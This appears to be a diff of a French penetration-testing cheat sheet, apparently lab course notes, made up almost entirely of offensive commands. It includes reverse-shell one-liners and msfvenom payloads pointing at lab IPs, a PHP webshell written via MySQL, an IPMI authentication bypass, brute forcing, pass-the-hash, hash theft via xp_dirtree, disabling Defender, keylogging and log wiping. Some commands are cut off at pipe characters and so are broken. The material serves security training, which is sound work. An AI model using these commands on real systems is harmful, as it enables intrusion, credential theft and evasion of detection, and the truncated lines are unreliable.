 ### Se connecter au serveur MSSQL en utilisant l'authentification Windows
+
 ```bash
 `mssqlclient.py <user>@<FQDN/IP> -windows-auth`
-```shell
+```
 
 ```sql
 # Obtenir la version du serveur Microsoft SQL
@@ -943,823 +1240,1208 @@ go
 
 # Lire les fichiers locaux dans MSSQL
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
-```shell
+```
+
 #### Oracle TNS
 
 ### Effectuer divers scans pour recueillir des informations sur les services de base de données Oracle et ses composants
+
 ```bash
 `python3 ./odat.py all -s <FQDN/IP>`
-```shell
+```
+
 ### Se connecter à la base de données Oracle
+
 ```bash
 `sqlplus <user>/<pass>@<FQDN/IP>/<db>`
-```shell
+```
+
 ### Télécharger un fichier avec Oracle RDBMS
+
 ```bash
 `python3 ./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt`
-```shell
+```
+
 #### IPMI
 
 ### Énumération dans une plage réseau
+
 ```bash
 `nmap -n-sU -p 623 $ip/24`
-```shell
+```
+
 ### Exécuter tous les scripts nmap liés au protocole IPMI
+
 ```bash
 `sudo nmap -sU --script ipmi* -p 623 $ip`
-```shell
+```
+
 ### Détection de la version IPMI
+
 ```bash
 `msf6 auxiliary(scanner/ipmi/ipmi_version)`
-```shell
+```
+
 ### Extraire les hachages IPMI. Similaire à l'attaque de récupération de hachage de mot de passe à distance d'authentification IPMI 2.0 RAKP
+
 ```bash
 `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)`
-```shell
+```
+
 ### **Attaque de contournement d'authentification IPMI via Cipher 0**<br>Installer ipmitool et utiliser Cipher 0 pour extraire une liste d'utilisateurs. Avec -C 0, tout mot de passe est accepté
+
 ```bash
 `apt-get install ipmitool`<br>`ipmitool -I lanplus -C 0 -H $ip -U root -P root user list`
-```shell
+```
+
 ### **Attaque de récupération de hachage de mot de passe à distance d'authentification IPMI 2.0 RAKP**<br>Installer ipmitool et changer le mot de passe de root
+
 ```bash
 `apt-get install ipmitool`<br>`ipmitool -I lanplus -C 0 -H $ip -U root -P root user set password 2 abc123`
-```shell
+```
+
 ### Gestion à Distance Linux
 
 ### Audit de sécurité à distance du service SSH cible
+
 ```bash
 `ssh-audit.py <FQDN/IP>`
-```shell
+```
+
 ### Se connecter au serveur SSH en utilisant le client SSH
+
 ```bash
 `ssh <user>@<FQDN/IP>`
-```shell
+```
+
 ### Se connecter au serveur SSH en utilisant une clé privée
+
 ```bash
 `ssh -i private.key <user>@<FQDN/IP>`
-```shell
+```
+
 ### Forcer l'authentification par mot de passe
+
 ```bash
 `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password`
-```shell
+```
+
 ### Gestion à Distance Windows
 
 #### RDP
 
 ### Analyse du service RDP
+
 ```bash
 `nmap -Pn -sV -p3389 --script rdp-* $ip`
-```shell
+```
+
 ### Un script Perl nommé [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) a été développé par [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) qui peut identifier de manière non authentifiée les paramètres de sécurité des serveurs RDP basés sur les poignées de main
+
 ```bash
 `git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check`<br><br>`./rdp-sec-check.pl $ip`
-```shell
+```
+
 ### Se connecter au serveur RDP depuis Linux
+
 ```bash
 `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>`
-```shell
+```
+
 ### Exécuter une commande en utilisant le service WMI
+
 ```bash
 `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"`
-```shell
+```
+
 #### WinRM
 
 ### Analyse du service WinRM
+
 ```bash
 `nmap -sV -sC $ip -p5985,5986 --disable-arp-ping -n`
-```shell
+```
+
 ### Se connecter au serveur WinRM
+
 ```bash
 `evil-winrm -i <FQDN/IP> -u <user> -p <password>`
-```shell
+```
+
 #### Windows Management Instrumentation (WMI)
 
 ### Se connecter au serveur WinRM
+
 ```bash
 `evil-winrm -i <FQDN/IP> -u <user> -p <password>`
-```shell
+```
+
 ### Exécuter une commande en utilisant le service WMI
+
 ```bash
 `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"`
-```shell
+```
+
 ## Shells & Payloads
 
 ### Outil en ligne de commande utilisé pour se connecter à une cible Windows via le protocole RDP
+
 ```bash
 `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`
-```shell
+```
+
 ### Fonctionne avec différents interpréteurs de commandes pour découvrir les variables d'environnement d'un système. C'est un excellent moyen de déterminer quel langage de shell est utilisé
+
 ```bash
 `env`
-```shell
-### Démarre un écouteur netcat sur un port spécifié
+```
+
+### Démarre un écouteur `netcat` sur un port spécifié
+
 ```bash
 `sudo nc -lvnp <port #>`
-```shell
+```
+
 ### Se connecte à un écouteur netcat à l'adresse IP et au port spécifiés
+
 ```bash
 `nc -nv <ip address of computer with listener started><port being listened on>`
-```shell
+```
+
 ### /bin/bash -i 2>&1 \
+
 ```bash
 `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \
-```shell
+```
+
 ### %{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \
+
 ```bash
 `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\
-```shell
-### Commande Powershell utilisée pour désactiver la surveillance en temps réel dans Windows Defender
+```
+
+### Commande Powershell utilisée pour désactiver la surveillance en temps réel dans `Windows Defender`
+
 ```bash
 `Set-MpPreference -DisableRealtimeMonitoring $true`
-```shell
-### Module d'exploit Metasploit qui peut être utilisé sur un système Windows vulnérable pour établir une session shell en utilisant smb & psexec
+```
+
+### Module d'exploit Metasploit qui peut être utilisé sur un système Windows vulnérable pour établir une session shell en utilisant `smb` & `psexec`
+
 ```bash
 `use exploit/windows/smb/psexec`
-```shell
-### Commande utilisée dans une session shell meterpreter pour accéder à un shell système
+```
+
+### Commande utilisée dans une session shell meterpreter pour accéder à un `shell système`
+
 ```bash
 `shell`
-```shell
-### Commande MSFvenom utilisée pour générer un payload stageless de shell inverse basé sur Linux
+```
+
+### Commande `MSFvenom` utilisée pour générer un payload `stageless` de shell inverse basé sur Linux
+
 ```bash
 `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`
-```shell
+```
+
 ### Commande MSFvenom utilisée pour générer un payload stageless de shell inverse basé sur Windows
+
 ```bash
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`
-```shell
+```
+
 ### Commande MSFvenom utilisée pour générer un payload de shell inverse basé sur MacOS
+
 ```bash
 `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`
-```shell
+```
+
 ### Commande MSFvenom utilisée pour générer un payload de shell inverse web ASP
+
 ```bash
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`
-```shell
+```
+
 ### Commande MSFvenom utilisée pour générer un payload de shell inverse web JSP
+
 ```bash
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`
-```shell
+```
+
 ### Commande MSFvenom utilisée pour générer un payload de shell inverse web compatible java/jsp au format WAR
+
 ```bash
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`
-```shell
-### Module d'exploit Metasploit utilisé pour vérifier si un hôte est vulnérable à ms17_010
+```
+
+### Module d'exploit Metasploit utilisé pour vérifier si un hôte est vulnérable à `ms17_010`
+
 ```bash
 `use auxiliary/scanner/smb/smb_ms17_010`
-```shell
+```
+
 ### Module d'exploit Metasploit utilisé pour obtenir une session shell inverse sur un système Windows vulnérable à ms17_010
+
 ```bash
 `use exploit/windows/smb/ms17_010_psexec`
-```shell
-### Module d'exploit Metasploit qui peut être utilisé pour obtenir un shell inverse sur un système Linux vulnérable hébergeant rConfig 3.9.6
+```
+
+### Module d'exploit Metasploit qui peut être utilisé pour obtenir un shell inverse sur un système Linux vulnérable hébergeant `rConfig 3.9.6`
+
 ```bash
 `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`
-```shell
-### Commande Python utilisée pour générer un shell interactif sur un système Linux
+```
+
+### Commande Python utilisée pour générer un `shell interactif` sur un système Linux
+
 ```bash
 `python -c 'import pty; pty.spawn("/bin/sh")'`
-```shell
+```
+
 ### Génère un shell interactif sur un système Linux
+
 ```bash
 `/bin/sh -i`
-```shell
-### Utilise perl pour générer un shell interactif sur un système Linux
+```
+
+### Utilise `perl` pour générer un shell interactif sur un système Linux
+
 ```bash
 `perl —e 'exec "/bin/sh";'`
-```shell
-### Utilise ruby pour générer un shell interactif sur un système Linux
+```
+
+### Utilise `ruby` pour générer un shell interactif sur un système Linux
+
 ```bash
 `ruby: exec "/bin/sh"`
-```shell
-### Utilise Lua pour générer un shell interactif sur un système Linux
+```
+
+### Utilise `Lua` pour générer un shell interactif sur un système Linux
+
 ```bash
 `Lua: os.execute('/bin/sh')`
-```shell
-### Utilise la commande awk pour générer un shell interactif sur un système Linux
+```
+
+### Utilise la commande `awk` pour générer un shell interactif sur un système Linux
+
 ```bash
 `awk 'BEGIN {system("/bin/sh")}'`
-```shell
-### Utilise la commande find pour générer un shell interactif sur un système Linux
+```
+
+### Utilise la commande `find` pour générer un shell interactif sur un système Linux
+
 ```bash
 `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`
-```shell
-### Une autre façon d'utiliser la commande find pour générer un shell interactif sur un système Linux
+```
+
+### Une autre façon d'utiliser la commande `find` pour générer un shell interactif sur un système Linux
+
 ```bash
 `find . -exec /bin/sh \; -quit`
-```shell
-### Utilise l'éditeur de texte VIM pour générer un shell interactif. Peut être utilisé pour échapper aux "jail-shells"
+```
+
+### Utilise l'éditeur de texte `VIM` pour générer un shell interactif. Peut être utilisé pour échapper aux "jail-shells"
+
 ```bash
 `vim -c ':!/bin/sh'`
-```shell
-### Utilisé pour lister les fichiers et répertoires sur un système Linux et affiche les permissions pour chaque fichier dans le répertoire choisi. Peut être utilisé pour rechercher des binaires que nous avons la permission d'exécuter
+```
+
+### Utilisé pour `lister` les fichiers et répertoires sur un système Linux et affiche les permissions pour chaque fichier dans le répertoire choisi. Peut être utilisé pour rechercher des binaires que nous avons la permission d'exécuter
+
 ```bash
 `ls -la <path/to/fileorbinary>`
-```shell
-### Affiche les commandes que l'utilisateur actuellement connecté peut exécuter avec sudo
+```
+
+### Affiche les commandes que l'utilisateur actuellement connecté peut exécuter avec `sudo`
+
 ```bash
 `sudo -l`
-```shell
-### Emplacement des webshells laudanum sur ParrotOS et Pwnbox
+```
+
+### Emplacement des `webshells laudanum` sur ParrotOS et Pwnbox
+
 ```bash
 `/usr/share/webshells/laudanum`
-```shell
-### Emplacement de Antak-Webshell sur Parrot OS et Pwnbox
+```
+
+### Emplacement de `Antak-Webshell` sur Parrot OS et Pwnbox
+
 ```bash
 `/usr/share/nishang/Antak-WebShell`
-```shell
-## Metasploit 🎯
+```
+
+## Metasploit
 
 ### Commandes MSFconsole
 
 ### Affiche tous les exploits dans le Framework
+
 ```bash
 `show exploits`
-```shell
+```
+
 ### Affiche tous les payloads dans le Framework
+
 ```bash
 `show payloads`
-```shell
+```
+
 ### Affiche tous les modules auxiliaires dans le Framework
+
 ```bash
 `show auxiliary`
-```shell
+```
+
 ### Recherche des exploits ou modules dans le Framework
+
 ```bash
 `search <name>`
-```shell
+```
+
 ### Charge les informations sur un exploit ou module spécifique
+
 ```bash
 `info`
-```shell
+```
+
 ### Charge un exploit ou module (exemple : use windows/smb/psexec)
+
 ```bash
 `use <name>`
-```shell
+```
+
 ### Charge un exploit en utilisant le numéro d'index affiché après la commande search
+
 ```bash
 `use <number>`
-```shell
+```
+
 ### L'adresse IP de votre hôte local accessible par la cible, souvent l'adresse IP publique lorsque vous n'êtes pas sur un réseau local. Généralement utilisé pour les shells inverses
+
 ```bash
 `LHOST`
-```shell
+```
+
 ### L'hôte distant ou la cible
+
 ```bash
 `RHOST`
-```shell
+```
+
 ### Définit une valeur spécifique (par exemple, LHOST ou RHOST)
+
 ```bash
 `set function`
-```shell
+```
+
 ### Définit une valeur spécifique globalement (par exemple, LHOST ou RHOST)
+
 ```bash
 `setg <function>`
-```shell
+```
+
 ### Affiche les options disponibles pour un module ou exploit
+
 ```bash
 `show options`
-```shell
+```
+
 ### Affiche les plateformes prises en charge par l'exploit
+
 ```bash
 `show targets`
-```shell
+```
+
 ### Spécifie un index de cible spécifique si vous connaissez l'OS et le service pack
+
 ```bash
 `set target <number>`
-```shell
+```
+
 ### Spécifie le payload à utiliser
+
 ```bash
 `set payload <payload>`
-```shell
+```
+
 ### Spécifie le numéro d'index du payload à utiliser après la commande show payloads
+
 ```bash
 `set payload <number>`
-```shell
+```
+
 ### Affiche les options avancées
+
 ```bash
 `show advanced`
-```shell
+```
+
 ### Migre automatiquement vers un processus séparé après l'achèvement de l'exploit
+
 ```bash
 `set autorunscript migrate -f`
-```shell
+```
+
 ### Détermine si une cible est vulnérable à une attaque
+
 ```bash
 `check`
-```shell
+```
+
 ### Exécute le module ou l'exploit et attaque la cible
+
 ```bash
 `exploit`
-```shell
+```
+
 ### Exécute l'exploit dans le contexte du job (cela exécutera l'exploit en arrière-plan)
+
 ```bash
 `exploit -j`
-```shell
+```
+
 ### N'interagit pas avec la session après une exploitation réussie
+
 ```bash
 `exploit -z`
-```shell
+```
+
 ### Spécifie l'encodeur de payload à utiliser (exemple : exploit –e shikata_ga_nai)
+
 ```bash
 `exploit -e <encoder>`
-```shell
+```
+
 ### Affiche l'aide pour la commande exploit
+
 ```bash
 `exploit -h`
-```shell
+```
+
 ### Liste les sessions disponibles (utilisé lors de la gestion de plusieurs shells)
+
 ```bash
 `sessions -l`
-```shell
+```
+
 ### Liste toutes les sessions disponibles et affiche les champs détaillés, comme la vulnérabilité utilisée lors de l'exploitation du système
+
 ```bash
 `sessions -l -v`
-```shell
+```
+
 ### Exécute un script Meterpreter spécifique sur toutes les sessions Meterpreter actives
+
 ```bash
 `sessions -s <script>`
-```shell
+```
+
 ### Termine toutes les sessions actives
+
 ```bash
 `sessions -K`
-```shell
+```
+
 ### Exécute une commande sur toutes les sessions Meterpreter actives
+
 ```bash
 `sessions -c <cmd>`
-```shell
+```
+
 ### Met à niveau a normal Win32 shell to a Meterpreter console
+
 ```bash
 `sessions -u <sessionID>`
-```shell
+```
+
 ### Crée une base de données à utiliser avec des attaques basées sur la base de données (exemple : db_create autopwn)
+
 ```bash
 `db_create <name>`
-```shell
+```
+
 ### Crée et se connecte à une base de données pour des attaques (exemple : db_connect autopwn)
+
 ```bash
 `db_connect <name>`
-```shell
+```
+
 ### Utilise Nmap et place les résultats dans une base de données (la syntaxe Nmap normale est prise en charge, comme –sT –v –P0)
+
 ```bash
 `db_nmap`
-```shell
+```
+
 ### Supprime la base de données actuelle
+
 ```bash
 `db_destroy`
-```shell
+```
+
 ### Supprime la base de données en utilisant des options avancées
+
 ```bash
 `db_destroy <user:password@host:port/database>`
-```shell
+```
+
 ---
 
 ### Commandes Meterpreter
 
 ### Affiche l'aide d'utilisation de Meterpreter
+
 ```bash
 `help`
-```shell
+```
+
 ### Exécute des scripts basés sur Meterpreter ; pour une liste complète, consultez le répertoire scripts/meterpreter
+
 ```bash
 `run <scriptname>`
-```shell
+```
+
 ### Affiche les informations système sur la cible compromise
+
 ```bash
 `sysinfo`
-```shell
+```
+
 ### Liste les fichiers et dossiers sur la cible
+
 ```bash
 `ls`
-```shell
+```
+
 ### Charge l'extension de privilèges pour les bibliothèques Meterpreter étendues
+
 ```bash
 `use priv`
-```shell
+```
+
 ### Affiche tous les processus en cours d'exécution et les comptes associés à chaque processus
+
 ```bash
 `ps`
-```shell
+```
+
 ### Migre vers un ID de processus spécifique (PID est l'ID du processus cible obtenu via la commande ps)
+
 ```bash
 `migrate <proc. id>`
-```shell
+```
+
 ### Charge les fonctions incognito (utilisé pour le vol et l'usurpation de jetons sur une machine cible)
+
 ```bash
 `use incognito`
-```shell
+```
+
 ### Liste les jetons disponibles sur la cible par utilisateur
+
 ```bash
 `list_tokens -u`
-```shell
+```
+
 ### Liste les jetons disponibles sur la cible par groupe
+
 ```bash
 `list_tokens -g`
-```shell
+```
+
 ### Usurpe un jeton disponible sur la cible
+
 ```bash
 `impersonate_token <DOMAIN_NAMEUSERNAME>`
-```shell
+```
+
 ### Vole les jetons disponibles pour un processus donné et usurpe ce jeton
+
 ```bash
 `steal_token <proc. id>`
-```shell
+```
+
 ### Arrête l'usurpation du jeton actuel
+
 ```bash
 `drop_token`
-```shell
+```
+
 ### Tente d'élever les privilèges au niveau SYSTEM via plusieurs vecteurs d'attaque
+
 ```bash
 `getsystem`
-```shell
+```
+
 ### Accède à un shell interactif avec tous les jetons disponibles
+
 ```bash
 `shell`
-```shell
+```
+
 ### Exécute cmd.exe et interagit avec lui
+
 ```bash
 `execute -f <cmd.exe> -i`
-```shell
+```
+
 ### Exécute cmd.exe avec tous les jetons disponibles
+
 ```bash
 `execute -f <cmd.exe> -i -t`
-```shell
+```
+
 ### Exécute cmd.exe avec tous les jetons disponibles et le rend comme processus caché
+
 ```bash
 `execute -f <cmd.exe> -i -H -t`
-```shell
+```
+
 ### Revient à l'utilisateur original utilisé pour compromettre la cible
+
 ```bash
 `rev2self`
-```shell
+```
+
 ### Interagit, crée, supprime, interroge, définit et bien plus dans le registre de la cible
+
 ```bash
 `reg <command>`
-```shell
+```
+
 ### Bascule vers un écran différent en fonction de l'utilisateur connecté
+
 ```bash
 `setdesktop <number>`
-```shell
+```
+
 ### Prend une capture d'écran de l'écran de la cible
+
 ```bash
 `screenshot`
-```shell
+```
+
 ### Téléverse un fichier vers la cible
+
 ```bash
 `upload <filename>`
-```shell
+```
+
 ### Télécharge un fichier depuis la cible
+
 ```bash
 `download <filename>`
-```shell
+```
+
 ### Démarre la capture des frappes clavier sur la cible distante
+
 ```bash
 `keyscan_start`
-```shell
+```
+
 ### Extrait les frappes clavier capturées sur la cible
+
 ```bash
 `keyscan_dump`
-```shell
+```
+
 ### Arrête la capture des frappes clavier sur la cible distante
+
 ```bash
 `keyscan_stop`
-```shell
+```
+
 ### Obtient autant de privilèges que possible sur la cible
+
 ```bash
 `getprivs`
-```shell
+```
+
 ### Prend le contrôle du clavier et/ou de la souris
+
 ```bash
 `uictl enable <keyboard/mouse>`
-```shell
+```
+
 ### Exécute votre shell Meterpreter actuel en arrière-plan
+
 ```bash
 `background`
-```shell
+```
+
 ### Extrait tous les hachages sur la cible
+
 ```bash
 `hashdump`
-```shell
+```
+
 ### Charge le module sniffer
+
 ```bash
 `use sniffer`
-```shell
+```
+
 ### Liste les interfaces disponibles sur la cible
+
 ```bash
 `sniffer_interfaces`
-```shell
+```
+
 ### Démarre la capture sur la cible distante
+
 ```bash
 `sniffer_dump <interfaceID> pcapname`
-```shell
+```
+
 ### Démarre la capture avec une plage spécifique pour un tampon de paquets
+
 ```bash
 `sniffer_start <interfaceID> packet-buffer`
-```shell
+```
+
 ### Récupère les informations statistiques de l'interface que vous capturez
+
 ```bash
 `sniffer_stats <interfaceID>`
-```shell
+```
+
 ### Arrête le sniffer
+
 ```bash
 `sniffer_stop <interfaceID>`
-```shell
+```
+
 ### Ajoute un utilisateur sur la cible distante
+
 ```bash
 `add_user <username> <password> -h <ip>`
-```shell
+```
+
 ### Ajoute un nom d'utilisateur au groupe Administrateurs du domaine sur la cible distante
+
 ```bash
 `add_group_user <"Domain Admins"> <username> -h <ip>`
-```shell
+```
+
 ### Efface le journal des événements sur la machine cible
+
 ```bash
 `clearev`
-```shell
+```
+
 ### Modifie les attributs de fichier, comme la date de création (mesure anti-forensique)
+
 ```bash
 `timestomp`
-```shell
+```
+
 ### Redémarre la machine cible
+
 ```bash
 `reboot`
-```shell
+```
+
 ---
 
 ## Attaques des Services Courants
 
 ### Attaque FTP
 
-### Connexion au serveur FTP en utilisant le client ftp
+### Connexion au serveur FTP en utilisant le client `ftp`
+
 ```bash
 `ftp 192.168.2.142`
-```shell
-### Connexion au serveur FTP en utilisant netcat
+```
+
+### Connexion au serveur FTP en utilisant `netcat`
+
 ```bash
 `nc -v 192.168.2.142 21`
-```shell
+```
+
 ### Force brute du service FTP
+
 ```bash
 `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142`
-```shell
+```
+
 ### Force brute du service FTP
+
 ```bash
 `medusa -U users.list -P pws.list -h $ip -M ftp -n 2121`
-```shell
+```
+
 ### Attaque SMB
 
 ### Test de session nulle contre le service SMB
+
 ```bash
 `smbclient -N -L //10.129.14.128`
-```shell
-### Énumération des partages réseau en utilisant smbmap
+```
+
+### Énumération des partages réseau en utilisant `smbmap`
+
 ```bash
 `smbmap -H 10.129.14.128`
-```shell
-### Énumération récursive des partages réseau en utilisant smbmap
+```
+
+### Énumération récursive des partages réseau en utilisant `smbmap`
+
 ```bash
 `smbmap -H 10.129.14.128 -r notes`
-```shell
+```
+
 ### Téléchargement d'un fichier spécifique depuis le dossier partagé
+
 ```bash
 `smbmap -H 10.129.14.128 --download "notes\note.txt"`
-```shell
+```
+
 ### Téléversement d'un fichier spécifique vers le dossier partagé
+
 ```bash
 `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`
-```shell
-### Session nulle avec rpcclient
+```
+
+### Session nulle avec `rpcclient`
+
 ```bash
 `rpcclient -U'%' 10.10.110.17`
-```shell
-### Énumération automatisée du service SMB en utilisant enum4linux-ng
+```
+
+### Énumération automatisée du service SMB en utilisant `enum4linux-ng`
+
 ```bash
 `./enum4linux-ng.py 10.10.11.45 -A -C`
-```shell
+```
+
 ### Pulvérisation de mot de passe contre différents utilisateurs depuis une liste
+
 ```bash
 `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'`
-```shell
-### Connexion au service SMB en utilisant impacket-psexec
+```
+
+### Connexion au service SMB en utilisant `impacket-psexec`
+
 ```bash
 `impacket-psexec administrator:'Password123!'@10.10.110.17`
-```shell
-### Exécution d'une commande sur le service SMB en utilisant crackmapexec
+```
+
+### Exécution d'une commande sur le service SMB en utilisant `crackmapexec`
+
 ```bash
 `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`
-```shell
+```
+
 ### Énumération des utilisateurs connectés
+
 ```bash
 `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`
-```shell
+```
+
 ### Extraction des hachages depuis la base de données SAM
+
 ```bash
 `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`
-```shell
+```
+
 ### Utilisation de la technique Pass-The-Hash pour s'authentifier sur l'hôte cible
+
 ```bash
 `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`
-```shell
-### Extraction de la base de données SAM en utilisant impacket-ntlmrelayx
+```
+
+### Extraction de la base de données SAM en utilisant `impacket-ntlmrelayx`
+
 ```bash
 `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`
-```shell
-### Exécution d'un shell inverse basé sur PowerShell en utilisant impacket-ntlmrelayx
+```
+
+### Exécution d'un shell inverse basé sur PowerShell en utilisant `impacket-ntlmrelayx`
+
 ```bash
 `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>`
-```shell
+```
+
 ---
 
 ### Attaque des Bases de Données SQL
 
 ### Connexion au serveur MySQL
+
 ```bash
 `mysql -u julio -pPassword123 -h 10.129.20.13`
-```shell
+```
+
 ### Connexion au serveur MSSQL
+
 ```bash
 `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`
-```shell
+```
+
 ### Connexion au serveur MSSQL depuis Linux
+
 ```bash
 `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`
-```shell
+```
+
 ### Connexion au serveur MSSQL depuis Linux lorsque le mécanisme d'authentification Windows est utilisé par le serveur MSSQL
+
 ```bash
 `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`
-```shell
+```
+
 ### Afficher toutes les bases de données disponibles dans MySQL
+
 ```bash
 `mysql> SHOW DATABASES;`
-```shell
+```
+
 ### Sélectionner une base de données spécifique dans MySQL
+
 ```bash
 `mysql> USE htbusers;`
-```shell
+```
+
 ### Afficher toutes les tables disponibles dans la base de données sélectionnée dans MySQL
+
 ```bash
 `mysql> SHOW TABLES;`
-```shell
+```
+
 ### Sélectionner toutes les entrées disponibles de la table "users" dans MySQL
+
 ```bash
 `mysql> SELECT * FROM users;`
-```shell
+```
+
 ### Afficher toutes les bases de données disponibles dans MSSQL
+
 ```bash
 `sqlcmd> SELECT name FROM master.dbo.sysdatabases`
-```shell
+```
+
 ### Sélectionner une base de données spécifique dans MSSQL
+
 ```bash
 `sqlcmd> USE htbusers`
-```shell
+```
+
 ### Afficher toutes les tables disponibles dans la base de données sélectionnée dans MSSQL
+
 ```bash
 `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`
-```shell
+```
+
 ### Sélectionner toutes les entrées disponibles de la table "users" dans MSSQL
+
 ```bash
 `sqlcmd> SELECT * FROM users`
-```shell
+```
+
 ### Pour autoriser la modification des options avancées
+
 ```bash
 `sqlcmd> EXECUTE sp_configure 'show advanced options', 1`
-```shell
+```
+
 ### Pour activer xp_cmdshell
+
 ```bash
 `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`
-```shell
+```
+
 ### À utiliser après chaque commande sp_configure pour appliquer les modifications
+
 ```bash
 `sqlcmd> RECONFIGURE`
-```shell
+```
+
 ### Exécuter une commande système depuis le serveur MSSQL
+
 ```bash
 `sqlcmd> xp_cmdshell 'whoami'`
-```shell
+```
+
 ### Créer un fichier en utilisant MySQL
+
 ```bash
 `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`
-```shell
+```
+
 ### Vérifier si les privilèges de fichier sécurisé sont vides pour lire les fichiers stockés localement sur le système
+
 ```bash
 `mysql> show variables like "secure_file_priv";`
-```shell
+```
+
 ### Lire des fichiers locaux dans MSSQL
+
 ```bash
 `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`
-```shell
+```
+
 ### Lire des fichiers locaux dans MySQL
+
 ```bash
 `mysql> select LOAD_FILE("/etc/passwd");`
-```shell
-### Vol de hachages en utilisant la commande xp_dirtree dans MSSQL
+```
+
+### Vol de hachages en utilisant la commande `xp_dirtree` dans MSSQL
+
 ```bash
 `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`
-```shell
-### Vol de hachages en utilisant la commande xp_subdirs dans MSSQL
+```
+
+### Vol de hachages en utilisant la commande `xp_subdirs` dans MSSQL
+
 ```bash
 `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`
-```shell
+```
+
 ### Identifier les serveurs liés dans MSSQL
+
 ```bash
 `sqlcmd> SELECT srvname, isremote FROM sysservers`
-```shell
+```
+
 ### Identifier l'utilisateur et ses privilèges utilisés pour la connexion distante dans MSSQL
+
 ```bash
 `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`
-```shell
+```
+
 ---
 
 ### Attacking RDP
 
 ### Pulvérisation de mot de passe contre le service RDP
+
 ```bash
 `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`
-```shell
+```
+
 ### Force brute du service RDP
+
 ```bash
 `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`
-```shell
-### Connexion au service RDP en utilisant rdesktop sous Linux
+```
+
+### Connexion au service RDP en utilisant `rdesktop` sous Linux
+
 ```bash
 `rdesktop -u admin -p password123 192.168.2.143`
-```shell
+```
+
 ### Usurper un utilisateur sans son mot de passe
+
 ```bash
 `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`
-```shell
+```
+
 ### Exécuter le détournement de session RDP
+
 ```bash
 `net start sessionhijack`
-```shell
+```
+
 ### Activer le "Mode Admin Restreint" sur l'hôte Windows cible
+
 ```bash
 `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
-```shell
+```
+
 ### Utiliser la technique Pass-The-Hash pour se connecter à l'hôte cible sans mot de passe
+
 ```bash
 `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`
-```shell
+```
+
 ### Attaque DNS
 
 ### Effectuer une tentative de transfert de zone AXFR contre un serveur de noms spécifique
+
 ```bash
 `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`
-```shell
+```
+
 ### Force brute des sous-domaines
+
 ```bash
 `subfinder -d inlanefreight.com -v`
-```shell
+```
+
 ### Recherche DNS pour le sous-domaine spécifié
+
 ```bash
 `host support.inlanefreight.com`
-```shell
+```
+
 ### Attaque des Services Email
 
 ### Recherche DNS des serveurs de messagerie pour le domaine spécifié
+
 ```bash
 `host -t MX microsoft.com`
-```shell
+```
+
 ### grep "MX" \
+
 ```bash
 `dig mx inlanefreight.com \
-```shell
+```
+
 ### Recherche DNS de l'adresse IPv4 pour le sous-domaine spécifié
+
 ```bash
